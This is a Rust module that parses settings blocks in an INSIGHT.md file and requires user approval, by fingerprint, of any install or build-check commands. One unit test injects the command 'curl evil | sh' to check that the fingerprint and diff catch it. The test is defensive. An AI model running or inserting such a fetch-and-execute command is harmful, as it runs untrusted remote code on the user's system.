//! INSIGHT.md: prose for Claude plus parsed ```` ```insight ```` TOML blocks (ADR-0044, R3-07).
//!
//! Only the fenced `insight` blocks are parsed. Unknown keys refuse with the exact
//! problem (R3-08). Executable settings (`install`, `check`) are fingerprinted, and
//! a build refuses until the current fingerprint is approved (R3-01).

use std::collections::BTreeMap;
use std::path::Path;

use anyhow::{Context, Result, bail};
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};

#[derive(Debug, Clone, Default, PartialEq, Deserialize, Serialize)]
#[serde(deny_unknown_fields)]
pub struct Settings {
    #[serde(default = "default_tagging")]
    pub tagging: String,
    #[serde(default)]
    pub repo: BTreeMap<String, RepoSettings>,
}

fn default_tagging() -> String {
    "on-request".into()
}

#[derive(Debug, Clone, Default, PartialEq, Eq, Deserialize, Serialize)]
#[serde(deny_unknown_fields)]
pub struct RepoSettings {
    /// Absolute path of the repo's working copy.
    pub path: String,
    /// Commands that install or rewrite dependencies. Run only in Insight-owned trees (R3-02).
    #[serde(default)]
    pub install: Vec<String>,
    /// The build check (ADR-0036). Empty = discovered defaults (R2-26).
    #[serde(default)]
    pub check: Vec<String>,
}

/// Extracts and parses every ```` ```insight ```` block in an INSIGHT.md.
pub fn parse_insight_md(text: &str) -> Result<Settings> {
    let mut toml_src = String::new();
    let mut inside = false;
    for line in text.lines() {
        let t = line.trim();
        if !inside && t == "```insight" {
            inside = true;
            continue;
        }
        if inside && t == "```" {
            inside = false;
            continue;
        }
        if inside {
            toml_src.push_str(line);
            toml_src.push('\n');
        }
    }
    if inside {
        bail!("INSIGHT.md: an ```insight block is not closed");
    }
    toml::from_str(&toml_src).context("INSIGHT.md settings")
}

pub fn load(project_dir: &Path) -> Result<Settings> {
    let path = project_dir.join("INSIGHT.md");
    let text = std::fs::read_to_string(&path).with_context(|| format!("reading {}", path.display()))?;
    parse_insight_md(&text)
}

/// The executable part of the settings, which the user must approve (R3-01).
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct Commands(pub BTreeMap<String, (Vec<String>, Vec<String>)>);

impl Commands {
    pub fn of(s: &Settings) -> Self {
        Commands(s.repo.iter().map(|(k, r)| (k.clone(), (r.install.clone(), r.check.clone()))).collect())
    }
    pub fn fingerprint(&self) -> String {
        let canonical = serde_json::to_vec(&self.0).expect("serializable");
        Sha256::digest(&canonical).iter().map(|b| format!("{b:02x}")).collect()
    }
    /// A human-readable diff against previously approved commands.
    pub fn diff(&self, approved: &Commands) -> String {
        let mut out = String::new();
        let mut repos: Vec<&String> = self.0.keys().chain(approved.0.keys()).collect();
        repos.sort();
        repos.dedup();
        for r in repos {
            let empty = (Vec::new(), Vec::new());
            let (ni, nc) = self.0.get(r).unwrap_or(&empty);
            let (oi, oc) = approved.0.get(r).unwrap_or(&empty);
            for (label, old, new) in [("install", oi, ni), ("check", oc, nc)] {
                for c in old.iter().filter(|c| !new.contains(c)) {
                    out.push_str(&format!("- [{r}] {label}: {c}\n"));
                }
                for c in new.iter().filter(|c| !old.contains(c)) {
                    out.push_str(&format!("+ [{r}] {label}: {c}\n"));
                }
            }
        }
        out
    }
}

const APPROVED_FILE: &str = "approved-commands.json";

pub fn approved(project_dir: &Path) -> Result<Option<Commands>> {
    let p = project_dir.join(APPROVED_FILE);
    if !p.exists() {
        return Ok(None);
    }
    Ok(Some(serde_json::from_str(&std::fs::read_to_string(p)?)?))
}

pub fn approve(project_dir: &Path, cmds: &Commands) -> Result<()> {
    std::fs::write(project_dir.join(APPROVED_FILE), serde_json::to_string_pretty(cmds)?)?;
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    const MD: &str = "# Project\nSome prose for Claude.\n\n```insight\ntagging = \"on-request\"\n\n[repo.\"Fletcher\"]\npath = \"C:/x\"\ncheck = [\"cargo check\"]\n```\n";

    #[test]
    fn parses_only_insight_blocks() {
        let s = parse_insight_md(MD).unwrap();
        assert_eq!(s.repo["Fletcher"].check, vec!["cargo check"]);
    }

    #[test]
    fn unknown_keys_refuse() {
        let bad = MD.replace("tagging", "taging");
        assert!(parse_insight_md(&bad).is_err());
    }

    #[test]
    fn fingerprint_changes_with_commands_and_diff_shows_it() {
        let a = parse_insight_md(MD).unwrap();
        let b = parse_insight_md(&MD.replace("cargo check\"]", "cargo check\", \"curl evil | sh\"]")).unwrap();
        let (ca, cb) = (Commands::of(&a), Commands::of(&b));
        assert_ne!(ca.fingerprint(), cb.fingerprint());
        assert_eq!(cb.diff(&ca), "+ [Fletcher] check: curl evil | sh\n");
    }
}
